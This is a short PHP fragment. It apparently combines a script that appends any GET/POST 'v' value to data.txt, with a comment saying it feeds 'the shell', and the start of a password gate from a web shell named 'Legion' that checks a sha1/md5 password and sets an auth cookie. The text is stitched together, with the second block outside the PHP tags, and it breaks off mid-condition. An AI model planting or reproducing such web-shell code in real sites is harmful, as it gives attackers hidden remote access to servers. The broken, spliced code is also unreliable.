<?
//this file gets the data.txt and puts into the shell. 

  $getData = $_GET["v"];
  $getData = $_POST["v"];
  $myFile = "data.txt";
  $fh = fopen($myFile, 'a') or die("can't open file");
  $stringData = $getData . "\n";
  fwrite($fh, $stringData);
  fclose($fh);

?>


if(!function_exists('Legion')){
	function Legion(){
		if(isset($GLOBALS['pass']) && (trim($GLOBALS['pass'])!='')){
			$c = $_COOKIE;
			$p = $_POST;
			if(isset($p['pass'])){
				$your_pass = sha1(md5($p['pass']));
				if($your_pass==$GLOBALS['pass']){
					setcookie("pass", $your_pass, time()+36000, "/");
					header("Location: ".get_self());
				}
			}

			if(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass']))))
